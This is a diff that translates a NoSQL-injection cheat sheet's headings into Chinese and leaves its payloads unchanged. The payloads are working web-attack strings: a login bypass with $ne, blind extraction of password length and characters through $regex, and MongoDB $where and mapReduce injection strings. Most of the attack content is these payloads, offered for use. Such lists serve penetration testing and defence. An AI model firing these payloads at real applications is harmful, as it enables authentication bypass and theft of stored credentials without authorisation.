@@ -1,20 +1,20 @@
-# NoSQL injection
-NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
+# 非关系型数据库
+非关系型数据库相比传统的数据库提供更宽松的一致性限制。通过减少关系约束和一致性检查,非关系型数据库通常提供性能和扩展优势。然而,即使它们不使用传统的数据库语法，这些数据库仍然可能容易受到注入攻击。
 
-## Exploit
-
-Basic authentication bypass using not equal ($ne)
+## 攻击
+ 
+使用不相等的基本身份验证旁路 ($ne)
 ```
 username[$ne]=toto&password[$ne]=toto
 ```
-
-Extract length information
+ 
+提取长度信息
 ```
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
-Extract data information
+提取数据信息
 ```
 username[$ne]=toto&password[$regex]=m.{2}
 username[$ne]=toto&password[$regex]=md.{1}
@@ -24,7 +24,7 @@ username[$ne]=toto&password[$regex]=m.*
 username[$ne]=toto&password[$regex]=md.*
 ```
 
-## MongoDB Payloads
+## MongoDB有效载荷
 ```
 true, $where: '1 == 1'
 , $where: '1 == 1'
@@ -46,7 +46,7 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 ```
 
 
-## Thanks to
+## 感谢
 * https://www.dailysecurity.fr/nosql-injections-classique-blind/
 * https://www.owasp.org/index.php/Testing_for_NoSQL_injection
 * https://github.com/cr0hn/nosqlinjection_wordlists
